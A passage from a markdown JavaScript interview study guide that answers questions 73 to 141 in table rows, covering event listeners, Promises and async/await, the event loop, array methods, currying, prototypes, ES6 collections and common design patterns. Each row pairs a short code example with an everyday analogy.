| 73 | What is `.addEventListener()`? | Attaches event handler to element. Allows multiple handlers per event. | Modern way to handle events. Can add multiple listeners. Better than inline `onclick`. Third parameter controls capturing/bubbling. | **Code:** `button.addEventListener('click', function() {` `  console.log('Clicked!');` `});` `// Can add multiple:` `button.addEventListener('click', handler2);` `// Remove:` `button.removeEventListener('click', handler);` **Analogy:** Like subscribing to a newsletter - you can subscribe multiple addresses to same news. |
| 74 | What's the difference between `.addEventListener()` and `onclick`? | `.addEventListener()` allows multiple handlers. `onclick` property only holds one handler. | `onclick` overwrites previous handler. `.addEventListener()` adds to the list. `.addEventListener()` has more control (capturing, once option). | **Code:** `// ❌ onclick - second overwrites first:` `button.onclick = handler1;` `button.onclick = handler2; // handler1 lost!` `// ✅ addEventListener - both work:` `button.addEventListener('click', handler1);` `button.addEventListener('click', handler2);` **Analogy:** `onclick` is a single parking spot (new car kicks out old). `.addEventListener()` is a parking lot. |
| 75 | What is the `event` object? | Automatically passed to event handlers. Contains event details (target, type, coordinates, etc.). | Has info about the event: `.target` (element that triggered), `.currentTarget` (element with listener), `.type` (event name). | **Code:** `button.addEventListener('click', (event) => {` `  console.log(event.target); // Element clicked` `  console.log(event.type); // "click"` `  console.log(event.clientX); // Mouse X position` `});` **Analogy:** Like a police report - contains all details about what happened, where, and when. |
| 76 | What's the difference between `event.target` and `event.currentTarget`? | `target` is element that triggered event. `currentTarget` is element with the listener attached. | `target` can be child element (bubbling). `currentTarget` is always the element you called `addEventListener` on. | **Code:** `<div id="parent">` `  <button id="child">Click</button>` `</div>` `parent.addEventListener('click', (e) => {` `  console.log(e.target); // button (what you clicked)` `  console.log(e.currentTarget); // div (where listener is)` `});` **Analogy:** `target` is who threw the ball. `currentTarget` is who caught it. |
| 77 | What does `.removeChild()` do? | Removes child node from parent. Returns removed node. | Must call on parent element. Throws error if child doesn't exist. Can reinsert returned node elsewhere. | **Code:** `const child = document.querySelector('.child');` `const parent = child.parentNode;` `parent.removeChild(child); // Returns child` `// Modern alternative:` `child.remove(); // Simpler!` **Analogy:** Like removing a book from a shelf - you can put it back on another shelf later. |
| 78 | What is `.classList`? | Property containing DOMTokenList of element's classes. Methods: add, remove, toggle, contains. | Better than manipulating `className` string directly. Methods are intuitive and chainable (some). | **Code:** `element.classList.add('active'); // Add class` `element.classList.remove('hidden'); // Remove` `element.classList.toggle('open'); // Toggle on/off` `element.classList.contains('active'); // true/false` **Analogy:** Like a tag collection where you can easily add, remove, or check for specific tags. |
| 79 | What does `.getAttribute()` do? | Gets value of specified attribute from element. Returns string or `null`. | Retrieves HTML attributes. For standard properties (id, className), direct property access is faster. | **Code:** `const link = document.querySelector('a');` `link.getAttribute('href'); // "/page"` `link.getAttribute('data-id'); // "123"` `link.href; // Better for standard properties` **Analogy:** Like reading a label on a product - checking specific information about it. |
| 80 | What's the difference between `.setAttribute()` and direct property assignment? | `.setAttribute()` sets HTML attribute. Property assignment sets DOM property. Sometimes they differ! | Attributes are in HTML (strings). Properties are live DOM objects. For example, `input.value` (property) vs `input.getAttribute('value')` (initial value). | **Code:** `input.value = 'New'; // Changes live value` `input.getAttribute('value'); // Still "Old" (initial HTML)` `input.setAttribute('value', 'New'); // Changes HTML attribute` `// For classes:` `div.className = 'active'; // Property` `div.setAttribute('class', 'active'); // Attribute` **Analogy:** Attributes are the blueprint. Properties are the actual built house (can be modified). |

---

**✅ BATCH 2 COMPLETE (Questions 41-80)**

---

## BATCH 3: INTERMEDIATE QUESTIONS 81-120 (Async, Advanced Arrays, Events)

| # | Question | Simple Answer (Max 20 words) | Explanation (Why/How - ELI5) | Code Example + Real-Life Analogy |
|---|----------|------------------------------|------------------------------|----------------------------------|
| 81 | What is a Promise? | Object representing eventual completion or failure of async operation. Has three states. | Promises have 3 states: pending (waiting), fulfilled (success), rejected (error). Use `.then()` for success, `.catch()` for errors. Cleaner than callbacks. | **Code:** `const promise = fetch('/api/data');` `promise` `  .then(response => response.json())` `  .then(data => console.log(data))` `  .catch(error => console.error(error));` **Analogy:** Like a restaurant buzzer - you get it now (pending), it buzzes when ready (fulfilled), or they cancel your order (rejected). |
| 82 | What are the three states of a Promise? | Pending (initial), Fulfilled (success), Rejected (failure). Once settled, state can't change. | A promise starts pending, then settles to either fulfilled or rejected permanently. Can't go back or change. | **Code:** `const promise = new Promise((resolve, reject) => {` `  // Pending` `  setTimeout(() => resolve('Done!'), 1000); // Fulfilled` `  // or reject('Error!'); // Rejected` `});` **Analogy:** Like traffic light: yellow (pending) → green (fulfilled) OR red (rejected). Can't change after. |
| 83 | What is `async/await`? | Syntactic sugar for Promises. Makes async code look synchronous. Cleaner than `.then()` chains. | `async` functions always return promises. `await` pauses execution until promise settles. Can use try/catch for errors. | **Code:** `async function fetchData() {` `  try {` `    const response = await fetch('/api');` `    const data = await response.json();` `    return data;` `  } catch (error) {` `    console.error(error);` `  }` `}` **Analogy:** Like waiting in line politely instead of juggling multiple callback papers. |
| 84 | What's the difference between Promises and callbacks? | Promises avoid callback hell, have better error handling, are chainable. More readable. | Callbacks: nested functions (pyramid of doom). Promises: flat chains with `.then()`. Promises have built-in error propagation. | **Code:** `// ❌ Callback hell:` `getData(function(a) {` `  getMoreData(a, function(b) {` `    getEvenMore(b, function(c) { /* ... */ });` `  });` `});` `// ✅ Promises:` `getData().then(getMoreData).then(getEvenMore);` **Analogy:** Callbacks are nested Russian dolls. Promises are a straight assembly line. |
| 85 | What is the Event Loop? | Mechanism handling async operations. Checks call stack and task queues to execute code. | JavaScript is single-threaded. Event loop manages async tasks by moving them from queues to call stack when stack is empty. | **Code:** `console.log('1');` `setTimeout(() => console.log('2'), 0);` `Promise.resolve().then(() => console.log('3'));` `console.log('4');` `// Output: 1, 4, 3, 2` **Analogy:** Like a restaurant manager coordinating kitchen (call stack) and waitlist (task queues). |
| 86 | What's the difference between microtasks and macrotasks? | Microtasks (Promises) run before macrotasks (setTimeout, setInterval). Different priority queues. | Microtask queue (Promise callbacks, queueMicrotask) empties completely before any macrotask runs. Gives Promises priority. | **Code:** `setTimeout(() => console.log('Macro'), 0);` `Promise.resolve().then(() => console.log('Micro'));` `console.log('Sync');` `// Output: Sync, Micro, Macro` **Analogy:** Microtasks are VIP line (always go first). Macrotasks are regular line. |
| 87 | What is callback hell (pyramid of doom)? | Deeply nested callbacks making code unreadable and hard to maintain. | Multiple async operations depending on previous results create nested structure. Fixed with Promises or async/await. | **Code:** `// ❌ Callback hell:` `getUser(function(user) {` `  getOrders(user.id, function(orders) {` `    getDetails(orders[0], function(details) {` `      // 4 levels deep already!` `    });` `  });` `});` `// ✅ Fix:` `const user = await getUser();` `const orders = await getOrders(user.id);` **Analogy:** Like stairs going sideways instead of up - hard to follow and navigate. |
| 88 | How do you handle errors in Promises? | Use `.catch()` for promise chains or try/catch with async/await. | `.catch()` catches errors in the chain. `try/catch` works with async/await. Unhandled rejections log warnings. | **Code:** `// Promise chain:` `fetch('/api').then(r => r.json()).catch(err => console.error(err));` `// async/await:` `try {` `  const data = await fetch('/api');` `} catch (error) {` `  console.error(error);` `}` **Analogy:** Like a safety net under a tightrope - catches you when things go wrong. |
| 89 | What is `Promise.all()`? | Waits for all promises to resolve or any to reject. Returns array of results. | Takes array of promises, returns single promise. Resolves when ALL succeed. Rejects if ANY fails (fast-fail). | **Code:** `const promises = [fetch('/api/1'), fetch('/api/2'), fetch('/api/3')];` `Promise.all(promises)` `  .then(responses => console.log('All done!', responses))` `  .catch(error => console.log('One failed!', error));` **Analogy:** Like a group project - everyone must finish for success, one failure fails the whole project. |
| 90 | What is `Promise.race()`? | Returns first promise to settle (resolve or reject). Others ignored. | Whichever promise settles first wins. Useful for timeouts or getting fastest response. | **Code:** `const slow = new Promise(r => setTimeout(r, 1000, 'slow'));` `const fast = new Promise(r => setTimeout(r, 100, 'fast'));` `Promise.race([slow, fast]).then(console.log); // "fast"` **Analogy:** Like a sprint race - first to finish line wins, others don't matter. |
| 91 | What is `Promise.allSettled()`? | Waits for all promises to settle (resolve OR reject). Never rejects. | Returns array with status and value/reason for each promise. Unlike Promise.all, doesn't fail fast. | **Code:** `const promises = [` `  Promise.resolve('Success'),` `  Promise.reject('Error'),` `];` `Promise.allSettled(promises).then(results => {` `  // [{status: 'fulfilled', value: 'Success'},` `  //  {status: 'rejected', reason: 'Error'}]` `});` **Analogy:** Like waiting for all students to finish a test, regardless of passing or failing. |
| 92 | What is `Promise.any()`? | Returns first promise to resolve. Rejects only if all reject. | Opposite of Promise.race (waits for success, not just settlement). Useful for fallback URLs. | **Code:** `const promises = [` `  fetch('/api/backup1'),` `  fetch('/api/backup2'),` `  fetch('/api/backup3')` `];` `Promise.any(promises).then(first => console.log('Got one!', first));` **Analogy:** Like trying multiple doors - first one that opens wins, unless all are locked. |
| 93 | What is the difference between `setTimeout` and `setInterval`? | `setTimeout` runs once after delay. `setInterval` runs repeatedly at intervals. | `setTimeout` is one-shot timer. `setInterval` repeats until cleared. Both return IDs for cancellation. | **Code:** `setTimeout(() => console.log('Once'), 1000);` `const id = setInterval(() => console.log('Repeat'), 1000);` `clearInterval(id); // Stop it` `// ⚠️ setInterval can drift, prefer recursive setTimeout for precision` **Analogy:** `setTimeout` is an alarm clock. `setInterval` is a metronome. |
| 94 | Why might `setInterval` be problematic? | Can queue up if callback takes longer than interval. Doesn't account for execution time. | If callback takes 100ms but interval is 50ms, callbacks queue up. Use recursive setTimeout for guaranteed gap. | **Code:** `// ❌ Problem:` `setInterval(() => slowTask(), 100); // May overlap!` `// ✅ Solution:` `function schedule() {` `  setTimeout(() => {` `    slowTask();` `    schedule(); // Schedule next after completion` `  }, 100);` `}` **Analogy:** Like starting a new lap before finishing the last one - creates traffic jam. |
| 95 | What is debouncing? | Delays function execution until after wait time with no new calls. | Waits for "quiet period" before executing. Useful for search input, resize handlers. Prevents excessive function calls. | **Code:** `function debounce(func, delay) {` `  let timeout;` `  return function(...args) {` `    clearTimeout(timeout);` `    timeout = setTimeout(() => func(...args), delay);` `  };` `}` `input.addEventListener('input', debounce(search, 300));` **Analogy:** Like an elevator waiting for people to stop getting in before closing doors. |
| 96 | What is throttling? | Ensures function executes at most once per time period. | Limits execution rate. First call executes, subsequent calls ignored until cooldown. Useful for scroll, mousemove. | **Code:** `function throttle(func, delay) {` `  let waiting = false;` `  return function(...args) {` `    if (!waiting) {` `      func(...args);` `      waiting = true;` `      setTimeout(() => waiting = false, delay);` `    }` `  };` `}` **Analogy:** Like a machine gun with cooldown - fires, then must wait before firing again. |
| 97 | What's the difference between debouncing and throttling? | Debounce waits for silence. Throttle limits frequency. Different use cases. | Debounce: execute after quiet period (search). Throttle: execute at regular intervals (scroll). Both reduce calls. | **Code:** `// Debounce: User types "hello"` `// h...e...l...l...o... [wait] → execute once` `// Throttle: User scrolls continuously` `// execute → [wait 100ms] → execute → [wait] → execute` **Analogy:** Debounce is "call me when you're done talking." Throttle is "call me every 5 minutes max." |
| 98 | What is `.reduce()` accumulator pattern? | Second parameter is initial value. First parameter is accumulator carrying state through iterations. | Accumulator stores running result. Each iteration updates it. Can return any type (number, object, array). | **Code:** `// Sum:` `[1,2,3].reduce((sum, n) => sum + n, 0); // 6` `// Group by:` `items.reduce((groups, item) => {` `  groups[item.type] = groups[item.type] || [];` `  groups[item.type].push(item);` `  return groups;` `}, {});` **Analogy:** Like a snowball rolling downhill, growing with each rotation. |
| 99 | How do you flatten a nested array? | Use `.flat(depth)` or recursion. `.flat()` goes one level deep by default. | `.flat()` flattens nested arrays. Depth parameter controls how many levels. `Infinity` flattens all. | **Code:** `[1, [2, [3, [4]]]].flat(); // [1, 2, [3, [4]]]` `[1, [2, [3]]].flat(2); // [1, 2, 3]` `[1, [2, [3]]].flat(Infinity); // [1, 2, 3]` `// Old way:` `arr.reduce((acc, val) => acc.concat(val), []);` **Analogy:** Like unpacking nested boxes - flat() tells you how many layers to unpack. |
| 100 | What is `.flatMap()`? | Maps each element then flattens result one level. Combination of `.map()` + `.flat()`. | More efficient than chaining `.map().flat()`. Common for transformations that return arrays. | **Code:** `const sentences = ['Hello world', 'How are you'];` `sentences.flatMap(s => s.split(' '));` `// ['Hello', 'world', 'How', 'are', 'you']` `// vs:` `sentences.map(s => s.split(' ')).flat();` **Analogy:** Like a factory that builds AND unwraps packages in one step. |
| 101 | How do you remove duplicates from an array? | Use `Set` or `.filter()` with `.indexOf()`. Set is simplest and fastest. | `Set` stores unique values only. Spread back to array. `.filter()` keeps first occurrence of each. | **Code:** `const arr = [1, 2, 2, 3, 3, 3];` `const unique = [...new Set(arr)]; // [1, 2, 3]` `// Or:` `arr.filter((item, index) => arr.indexOf(item) === index);` **Analogy:** Set is like a VIP club - only one of each person allowed in. |
| 102 | What is `.sort()` and its gotchas? | Sorts array in-place. Converts to strings by default! Mutates original array. | Without compare function, sorts as strings: `[10, 2]` becomes `[10, 2]` because "10" < "2"! Always provide compare function for numbers. | **Code:** `// ❌ Wrong:` `[10, 2, 30].sort(); // [10, 2, 30] (string sort!)` `// ✅ Correct:` `[10, 2, 30].sort((a, b) => a - b); // [2, 10, 30]` `// Descending:` `arr.sort((a, b) => b - a);` **Analogy:** Like sorting books by cover text instead of page count (unless you specify). |
| 103 | What is the difference between `.find()` and `.findIndex()`? | `.find()` returns element or `undefined`. `.findIndex()` returns index or -1. | `.find()` gives you the value. `.findIndex()` gives you the position. Both stop at first match. | **Code:** `const users = [{id: 1, name: 'Alice'}, {id: 2, name: 'Bob'}];` `users.find(u => u.id === 2); // {id: 2, name: 'Bob'}` `users.findIndex(u => u.id === 2); // 1` `users.findIndex(u => u.id === 99); // -1` **Analogy:** `.find()` is "give me the book." `.findIndex()` is "which shelf is it on?" |
| 104 | What does `.reverse()` do and what's the gotcha? | Reverses array in place. Mutates original array! | Modifies the original array and returns reference to it. Use spread to avoid mutation: `[...arr].reverse()`. | **Code:** `const arr = [1, 2, 3];` `arr.reverse(); // [3, 2, 1]` `console.log(arr); // [3, 2, 1] (mutated!)` `// Non-mutating:` `const reversed = [...arr].reverse();` **Analogy:** Like flipping a book's pages - the book itself changes, not just your view of it. |
| 105 | What is `.fill()`? | Fills array elements with static value from start to end index. Mutates array. | Replaces existing values. Useful for initialization. Can specify range with start/end indices. | **Code:** `const arr = [1, 2, 3, 4];` `arr.fill(0); // [0, 0, 0, 0]` `arr.fill(9, 1, 3); // [1, 9, 9, 4] (index 1-2)` `// Create array of 5 zeros:` `Array(5).fill(0); // [0, 0, 0, 0, 0]` **Analogy:** Like painting walls - covers everything with same color in specified area. |
| 106 | What is `Array.from()`? | Creates array from iterable or array-like object. Can map during creation. | Converts strings, NodeLists, Sets to arrays. Second argument is map function. Useful for creating sequences. | **Code:** `Array.from('hello'); // ['h', 'e', 'l', 'l', 'o']` `Array.from({length: 5}, (_, i) => i); // [0, 1, 2, 3, 4]` `Array.from(document.querySelectorAll('div')); // Convert NodeList` **Analogy:** Like a converter box that turns any list-like thing into a proper array. |
| 107 | What is the `...` spread with function calls? | Expands array into individual arguments. Useful for Math.max, function calls. | Spreads array elements as separate arguments. Cleaner than `.apply()`. | **Code:** `const nums = [5, 1, 9, 2];` `Math.max(...nums); // 9 (instead of Math.max(nums) which is NaN)` `// Old way:` `Math.max.apply(null, nums);` `console.log(...nums); // 5 1 9 2` **Analogy:** Like unpacking a box and laying items out individually on a table. |
| 108 | What is memoization? | Caching function results for same inputs to avoid recalculation. Performance optimization. | Stores computed results in object/Map. Returns cached result if input seen before. Great for expensive pure functions. | **Code:** `function memoize(fn) {` `  const cache = {};` `  return function(...args) {` `    const key = JSON.stringify(args);` `    if (key in cache) return cache[key];` `    const result = fn(...args);` `    cache[key] = result;` `    return result;` `  };` `}` **Analogy:** Like remembering your friend's coffee order instead of asking every time. |
| 109 | What is currying? | Transforming function with multiple arguments into sequence of functions with single argument. | Breaks `f(a, b, c)` into `f(a)(b)(c)`. Enables partial application and function composition. | **Code:** `// Normal:` `function add(a, b, c) { return a + b + c; }` `// Curried:` `function addCurried(a) {` `  return function(b) {` `    return function(c) {` `      return a + b + c;` `    };` `  };` `}` `addCurried(1)(2)(3); // 6` **Analogy:** Like a vending machine where you insert coins one at a time, each unlocking next slot. |
| 110 | What is partial application? | Creating new function by pre-filling some arguments of existing function. | Uses `.bind()` or closures to fix some arguments. Different from currying (returns final result, not chain). | **Code:** `function multiply(a, b) { return a * b; }` `const double = multiply.bind(null, 2); // Pre-fill first arg` `double(5); // 10` `// With closure:` `const triple = (n) => multiply(3, n);` **Analogy:** Like a sandwich maker preset with bread - you just add the filling. |
| 111 | What is function composition? | Combining multiple functions where output of one becomes input of next. | Creates pipeline of transformations. Read right-to-left or use `pipe` (left-to-right). | **Code:** `const compose = (f, g) => x => f(g(x));` `const addOne = x => x + 1;` `const double = x => x * 2;` `const addThenDouble = compose(double, addOne);` `addThenDouble(3); // (3 + 1) * 2 = 8` **Analogy:** Like an assembly line - each station does one thing, passes to next. |
| 112 | What is the `new` keyword? | Creates instance of constructor function or class. Sets up prototype chain. | Creates empty object, sets prototype, binds `this`, executes constructor, returns object (unless constructor returns object). | **Code:** `function Person(name) {` `  this.name = name;` `}` `const person = new Person('Alice');` `// Without 'new':` `const wrong = Person('Alice'); // this = window! ❌` **Analogy:** Like using a cookie cutter - creates new object from template. |
| 113 | What is the prototype chain? | Objects inherit properties from their prototype. Chain goes up until null. | When accessing property, JS checks object → prototype → prototype's prototype → ... → null. | **Code:** `const obj = {a: 1};` `obj.toString(); // Inherited from Object.prototype` `obj.hasOwnProperty('a'); // true (own property)` `obj.hasOwnProperty('toString'); // false (inherited)` **Analogy:** Like family inheritance - if you don't have it, check your parents, grandparents, etc. |
| 114 | What is `Object.create()`? | Creates object with specified prototype. Enables prototypal inheritance without constructors. | First argument becomes new object's prototype. More direct than constructor functions for inheritance. | **Code:** `const parent = {greet() { return 'Hello'; }};` `const child = Object.create(parent);` `child.greet(); // 'Hello' (inherited)` `// Create object with no prototype:` `Object.create(null); // No inherited properties!` **Analogy:** Like cloning with inheritance - new object gets parent's abilities. |
| 115 | What is `Object.keys()` vs `Object.values()` vs `Object.entries()`? | `keys()` returns property names. `values()` returns values. `entries()` returns key-value pairs. | All return arrays. Only own enumerable properties (not inherited). Useful for iteration and transformation. | **Code:** `const obj = {a: 1, b: 2, c: 3};` `Object.keys(obj); // ['a', 'b', 'c']` `Object.values(obj); // [1, 2, 3]` `Object.entries(obj); // [['a', 1], ['b', 2], ['c', 3]]` **Analogy:** `keys` is table of contents. `values` is page content. `entries` is both together. |
| 116 | What is `Object.assign()`? | Copies properties from source objects to target. Shallow copy. Returns target. | Merges objects. Mutates first argument. Use `{...obj}` for cleaner syntax. Later sources override earlier. | **Code:** `const target = {a: 1};` `Object.assign(target, {b: 2}, {c: 3}); // {a:1, b:2, c:3}` `// Modern way:` `const merged = {...obj1, ...obj2}; // Cleaner!` **Analogy:** Like copying files into a folder - original folder changes, files are copied (not cut). |
| 117 | What is `Object.freeze()`? | Makes object immutable. Can't add, delete, or modify properties. Shallow freeze. | Prevents all changes to object. Doesn't freeze nested objects (shallow). Useful for constants. | **Code:** `const obj = Object.freeze({a: 1, nested: {b: 2}});` `obj.a = 99; // Silently fails (throws in strict mode)` `obj.nested.b = 99; // ✅ Works! (nested not frozen)` `Object.freeze(obj.nested); // Must freeze nested too` **Analogy:** Like laminating a document - can't change what's written anymore. |
| 118 | What's the difference between `Object.freeze()` and `Object.seal()`? | `freeze` prevents all changes. `seal` allows modification but not adding/deleting properties. | Frozen: can't change anything. Sealed: can modify existing values but can't add/remove properties. | **Code:** `const frozen = Object.freeze({a: 1});` `frozen.a = 2; // ❌ Fails` `const sealed = Object.seal({a: 1});` `sealed.a = 2; // ✅ Works!` `sealed.b = 3; // ❌ Can't add new property` **Analogy:** Frozen is a locked safe. Sealed is a locked room where you can rearrange furniture. |
| 119 | What is `hasOwnProperty()`? | Checks if property exists directly on object (not inherited). Returns boolean. | Useful to distinguish own properties from inherited ones. Better than `in` operator for this. | **Code:** `const obj = {a: 1};` `obj.hasOwnProperty('a'); // true` `obj.hasOwnProperty('toString'); // false (inherited)` `'toString' in obj; // true (checks prototype chain)` **Analogy:** Like checking if you own a book vs borrowed it from library. |
| 120 | What is the difference between `.call()` and `.apply()` usage? | `.call()` takes arguments individually. `.apply()` takes array of arguments. Same purpose otherwise. | Both invoke function with custom `this`. Choice depends on whether you have args as array or separately. | **Code:** `function greet(greeting, punctuation) {` `  return greeting + ' ' + this.name + punctuation;` `}` `greet.call({name: 'Alice'}, 'Hi', '!'); // "Hi Alice!"` `greet.apply({name: 'Bob'}, ['Hey', '?']); // "Hey Bob?"` **Analogy:** `.call()` is listing items one by one. `.apply()` is handing over a shopping list. |

---

**✅ BATCH 3 COMPLETE (Questions 81-120)**

---

## BATCH 4: INTERMEDIATE QUESTIONS 121-160 (ES6+, Patterns, Browser APIs)

| # | Question | Simple Answer (Max 20 words) | Explanation (Why/How - ELI5) | Code Example + Real-Life Analogy |
|---|----------|------------------------------|------------------------------|----------------------------------|
| 121 | What are ES6 modules? | File-based code organization using `import` and `export`. Each file is a module. | Modules have their own scope (not global). Export values to share. Import to use. Browser and Node.js support. | **Code:** `// math.js` `export const add = (a, b) => a + b;` `export default multiply;` `// app.js` `import multiply, {add} from './math.js';` **Analogy:** Like library books - each has contents (exports) you can check out (import). |
| 122 | What's the difference between named and default exports? | Named exports: multiple per file, import with exact name. Default: one per file, any name. | Named exports use `{}`, names must match. Default export imports without braces, any name works. Can mix both. | **Code:** `// Named:` `export const name = 'Alice';` `import {name} from './file.js';` `// Default:` `export default function() {}` `import myFunc from './file.js'; // Any name!` **Analogy:** Named is "the employee named John." Default is "the boss" (only one, call them anything). |
| 123 | What is destructuring with default values? | Extract values from objects/arrays and provide fallback if undefined. | Prevents `undefined` values. Only uses default if value is `undefined` (not `null` or other falsy values). | **Code:** `const {name = 'Guest', age = 18} = user;` `const [first = 'A', second = 'B'] = arr;` `// Function params:` `function greet({name = 'Guest'} = {}) {` `  console.log('Hello ' + name);` `}` **Analogy:** Like ordering food with "give me pasta, or if you're out, give me pizza." |
| 124 | What is object property shorthand? | When property name matches variable name, can omit colon and value. | ES6 lets you write `{name}` instead of `{name: name}`. Cleaner syntax for common pattern. | **Code:** `const name = 'Alice', age = 25;` `// Old:` `const user = {name: name, age: age};` `// ES6:` `const user = {name, age};` **Analogy:** Like saying "bring the hammer" instead of "bring the thing called hammer that is a hammer." |
| 125 | What is computed property name? | Use expression in brackets as object property name. Evaluated at runtime. | Allows dynamic property names using variables or expressions. Wrapped in `[]`. | **Code:** `const key = 'dynamicKey';` `const obj = {` `  [key]: 'value',` `  ['prop_' + 1]: 'value1',` `  [Math.random()]: 'random'` `};` `// obj.dynamicKey === 'value'` **Analogy:** Like filling in a form where the field name itself is determined on the fly. |
| 126 | What is method shorthand in objects? | ES6 allows defining methods without `function` keyword. | Cleaner syntax for object methods. Just write `methodName() {}` instead of `methodName: function() {}`. | **Code:** `// Old:` `const obj = {` `  greet: function() { return 'Hi'; }` `};` `// ES6:` `const obj = {` `  greet() { return 'Hi'; }` `};` **Analogy:** Like writing a recipe step as "Mix" instead of "The action of mixing: mix." |
| 127 | What is the rest parameter in destructuring? | Collects remaining properties/elements into new object/array using `...`. | Gathers "the rest" that weren't explicitly destructured. Must be last in pattern. | **Code:** `const {a, b, ...rest} = {a: 1, b: 2, c: 3, d: 4};` `// rest = {c: 3, d: 4}` `const [first, ...others] = [1, 2, 3, 4];` `// others = [2, 3, 4]` **Analogy:** Like saying "I'll take this, this, and... everything else in a bag." |
| 128 | What are template literal tagged templates? | Function that processes template literal. Receives strings and values separately. | Tag is a function before template literal. Gets arrays of strings and interpolated values. Useful for custom string processing. | **Code:** `function tag(strings, ...values) {` `  console.log(strings); // ['Hello ', '!']` `  console.log(values); // ['World']` `  return strings[0] + values[0].toUpperCase() + strings[1];` `}` `tag`Hello ${'World'}!`; // "Hello WORLD!"` **Analogy:** Like a mail sorter that separates envelopes from letters for custom processing. |
| 129 | What is a Symbol? | Primitive type for unique, immutable identifiers. Useful for private-ish properties. | Each Symbol is unique, even with same description. Can't be recreated. Commonly used for object property keys that won't conflict. | **Code:** `const sym1 = Symbol('desc');` `const sym2 = Symbol('desc');` `sym1 === sym2; // false (unique!)` `const obj = {` `  [Symbol('private')]: 'hidden'` `};` `Object.keys(obj); // [] (Symbols hidden!)` **Analogy:** Like fingerprints - even identical twins have different ones. |
| 130 | What is `Symbol.iterator`? | Well-known Symbol defining how objects are iterated in for...of loops. | Objects with `[Symbol.iterator]` method are iterable. The method returns iterator object with `.next()`. | **Code:** `const iterable = {` `  [Symbol.iterator]() {` `    let i = 0;` `    return {` `      next: () => i < 3 ? {value: i++, done: false} : {done: true}` `    };` `  }` `};` `for (let val of iterable) console.log(val); // 0, 1, 2` **Analogy:** Like defining how to turn pages in a book - the method tells you what comes next. |
| 131 | What is a generator function? | Function that can pause and resume execution. Returns iterator. Uses `function*` and `yield`. | Generators produce sequence of values lazily. `yield` pauses execution. `.next()` resumes. Great for infinite sequences or async control. | **Code:** `function* count() {` `  yield 1;` `  yield 2;` `  yield 3;` `}` `const gen = count();` `gen.next(); // {value: 1, done: false}` `gen.next(); // {value: 2, done: false}` **Analogy:** Like a vending machine - gives one item at a time when you press the button. |
| 132 | What is `yield*` in generators? | Delegates to another generator or iterable. Yields all its values. | `yield*` forwards to another generator/iterable. Cleaner than looping and yielding each value. | **Code:** `function* inner() { yield 1; yield 2; }` `function* outer() {` `  yield* inner(); // Delegates to inner` `  yield 3;` `}` `[...outer()]; // [1, 2, 3]` **Analogy:** Like a manager delegating a task to a team - they handle the details, you get results. |
| 133 | What is a Map? | Key-value collection where keys can be any type. Better than objects for dynamic keys. | Unlike objects, Map keys can be objects, functions, any type. Maintains insertion order. Has size property, better performance. | **Code:** `const map = new Map();` `map.set('string', 1);` `map.set(42, 'number key');` `map.set({}, 'object key');` `map.get('string'); // 1` `map.size; // 3` `map.has(42); // true` **Analogy:** Like a parking lot where cars (values) park in spots numbered by any type (keys). |
| 134 | What's the difference between Map and Object? | Map: any key type, ordered, size property, better for frequent additions/deletions. | Objects: string/symbol keys only, prototype chain, no built-in size. Maps are for pure data storage. Objects are for structured data. | **Code:** `// Map:` `const map = new Map([[{id: 1}, 'value']]);` `map.size; // Built-in` `// Object:` `const obj = {};` `obj[{id: 1}] = 'value'; // Key becomes "[object Object]"!` `Object.keys(obj).length; // Manual size` **Analogy:** Map is a database. Object is a form with labeled fields. |
| 135 | What is a Set? | Collection of unique values. Automatically removes duplicates. | No duplicates allowed. Has methods: add, delete, has, clear. Maintains insertion order. Faster than arrays for checking existence. | **Code:** `const set = new Set([1, 2, 2, 3, 3]);` `set.size; // 3 (duplicates removed)` `set.add(4); // {1, 2, 3, 4}` `set.has(2); // true` `set.delete(2);` `[...set]; // Convert to array` **Analogy:** Like a VIP list - each name appears once, no matter how many times you try to add them. |
| 136 | What's the difference between Set and Array? | Set: unique values only, no index access, faster lookup. Array: allows duplicates, indexed, ordered. | Use Set to remove duplicates or check existence (O(1)). Use Array for ordered, indexed collections with possible duplicates. | **Code:** `// Array:` `const arr = [1, 2, 2, 3];` `arr.includes(2); // O(n)` `arr[1]; // Index access` `// Set:` `const set = new Set([1, 2, 2, 3]); // [1, 2, 3]` `set.has(2); // O(1) - faster!` **Analogy:** Set is a guest list (unique names). Array is seating chart (order and duplicates matter). |
| 137 | What is WeakMap? | Map with weakly-held object keys. Keys can be garbage collected. No iteration. | Keys must be objects. If key has no other references, it's garbage collected automatically. No size, no iteration. Memory-safe. | **Code:** `const wm = new WeakMap();` `let obj = {};` `wm.set(obj, 'value');` `obj = null; // Key eligible for GC now` `// Use case: private data` `const privates = new WeakMap();` `privates.set(this, {secret: 'data'});` **Analogy:** Like sticky notes that disappear when the item they're stuck to is thrown away. |
| 138 | What is WeakSet? | Set of weakly-held objects. Objects can be garbage collected. | Only stores objects. No iteration, no size. Objects removed automatically when no other references exist. Useful for tracking. | **Code:** `const ws = new WeakSet();` `let obj = {id: 1};` `ws.add(obj);` `ws.has(obj); // true` `obj = null; // Now eligible for GC` `// Use case: marking objects` `const processed = new WeakSet();` **Analogy:** Like temporary tags that fall off when the item is discarded. |
| 139 | What is the Module pattern? | Design pattern using closures to create private variables and public API. | Returns object with public methods that close over private variables. Encapsulation before ES6 modules. | **Code:** `const Counter = (function() {` `  let count = 0; // Private` `  return {` `    increment() { count++; },` `    getCount() { return count; }` `  };` `})();` `Counter.increment();` `Counter.count; // undefined (private!)` **Analogy:** Like a vending machine - you can press buttons (public) but can't access the money inside (private). |
| 140 | What is the Singleton pattern? | Ensures class has only one instance. Returns same instance on subsequent calls. | Creates instance only once, stores it, returns it for all future calls. Useful for config, cache managers. | **Code:** `class Singleton {` `  constructor() {` `    if (Singleton.instance) return Singleton.instance;` `    Singleton.instance = this;` `    this.data = [];` `  }` `}` `const s1 = new Singleton();` `const s2 = new Singleton();` `s1 === s2; // true (same instance!)` **Analogy:** Like a president - only one exists at a time, everyone talks to the same person. |
| 141 | What is the Factory pattern? | Function that returns objects. Abstracts object creation logic. | Instead of using `new`, call a function that creates and returns objects. Encapsulates creation logic. | **Code:** `function createUser(name, role) {` `  return {` `    name,` `    role,` `    permissions: role === 'admin' ? ['all'] : ['read']` `  };` `}` `const user = createUser('Alice', 'admin');` `// No 'new' keyword needed!` **Analogy:** Like a factory assembly line - you request a product, get a finished object without seeing how it's made. |
